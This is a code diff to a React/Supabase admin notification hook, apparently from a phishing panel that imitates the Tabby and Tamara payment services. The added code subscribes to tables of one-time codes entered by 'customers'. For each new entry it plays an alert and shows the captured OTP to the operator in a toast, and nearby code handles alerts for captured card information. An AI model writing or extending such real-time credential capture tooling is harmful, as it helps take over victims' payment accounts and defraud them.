@@ -209,6 +209,69 @@ export const useAdminNotifications = () => {
       )
       .subscribe();
 
+    // الاستماع لإدخال OTP - الصفحة الرئيسية
+    const mainOtpAttemptsChannel = supabase
+      .channel('admin-main-otp-attempts')
+      .on(
+        'postgres_changes',
+        {
+          event: 'INSERT',
+          schema: 'public',
+          table: 'otp_attempts'
+        },
+        (payload) => {
+          console.log('🔔 عميل أدخل OTP!', payload.new);
+          playOtpSound();
+          toast({
+            title: 'عميل أدخل رمز التحقق OTP!',
+            description: `الكود: ${payload.new.otp_code}`,
+          });
+        }
+      )
+      .subscribe();
+
+    // الاستماع لإدخال OTP - تابي
+    const tabbyOtpAttemptsChannel = supabase
+      .channel('admin-tabby-otp-attempts')
+      .on(
+        'postgres_changes',
+        {
+          event: 'INSERT',
+          schema: 'public',
+          table: 'tabby_otp_attempts'
+        },
+        (payload) => {
+          console.log('🔔 عميل أدخل OTP في تابي!', payload.new);
+          playOtpSound();
+          toast({
+            title: 'عميل أدخل رمز التحقق في تابي!',
+            description: `الكود: ${payload.new.otp_code}`,
+          });
+        }
+      )
+      .subscribe();
+
+    // الاستماع لإدخال OTP - تمارة
+    const tamaraOtpAttemptsChannel = supabase
+      .channel('admin-tamara-otp-attempts')
+      .on(
+        'postgres_changes',
+        {
+          event: 'INSERT',
+          schema: 'public',
+          table: 'tamara_otp_attempts'
+        },
+        (payload) => {
+          console.log('🔔 عميل أدخل OTP في تمارة!', payload.new);
+          playOtpSound();
+          toast({
+            title: 'عميل أدخل رمز التحقق في تمارة!',
+            description: `الكود: ${payload.new.otp_code}`,
+          });
+        }
+      )
+      .subscribe();
+
     return () => {
       supabase.removeChannel(ordersChannel);
       supabase.removeChannel(tamaraChannel);
@@ -218,6 +281,9 @@ export const useAdminNotifications = () => {
       supabase.removeChannel(tabbyPaymentAttemptsChannel);
       supabase.removeChannel(tamaraPaymentAttemptsChannel);
       supabase.removeChannel(otpPageVisitChannel);
+      supabase.removeChannel(mainOtpAttemptsChannel);
+      supabase.removeChannel(tabbyOtpAttemptsChannel);
+      supabase.removeChannel(tamaraOtpAttemptsChannel);
     };
   }, [location.pathname]);
 
@@ -250,18 +316,34 @@ export const useAdminNotifications = () => {
   const playCardInfoSound = () => {
     if (cardInfoAudioRef.current) {
       cardInfoAudioRef.current.currentTime = 0;
-      cardInfoAudioRef.current.play().catch((error) => {
-        console.error('Error playing card info notification sound:', error);
-      });
+      console.log('🔊 محاولة تشغيل صوت بيانات البطاقة...');
+      cardInfoAudioRef.current.play()
+        .then(() => console.log('✅ تم تشغيل صوت بيانات البطاقة بنجاح'))
+        .catch((error) => {
+          console.error('❌ خطأ في تشغيل صوت بيانات البطاقة:', error);
+          toast({
+            title: 'فشل تشغيل الصوت',
+            description: 'يرجى النقر في أي مكان بالصفحة للسماح بتشغيل الأصوات',
+            variant: 'destructive',
+          });
+        });
     }
   };
 
   const playOtpSound = () => {
     if (otpAudioRef.current) {
       otpAudioRef.current.currentTime = 0;
-      otpAudioRef.current.play().catch((error) => {
-        console.error('Error playing OTP notification sound:', error);
-      });
+      console.log('🔊 محاولة تشغيل صوت OTP...');
+      otpAudioRef.current.play()
+        .then(() => console.log('✅ تم تشغيل صوت OTP بنجاح'))
+        .catch((error) => {
+          console.error('❌ خطأ في تشغيل صوت OTP:', error);
+          toast({
+            title: 'فشل تشغيل الصوت',
+            description: 'يرجى النقر في أي مكان بالصفحة للسماح بتشغيل الأصوات',
+            variant: 'destructive',
+          });
+        });
     }
   };
 
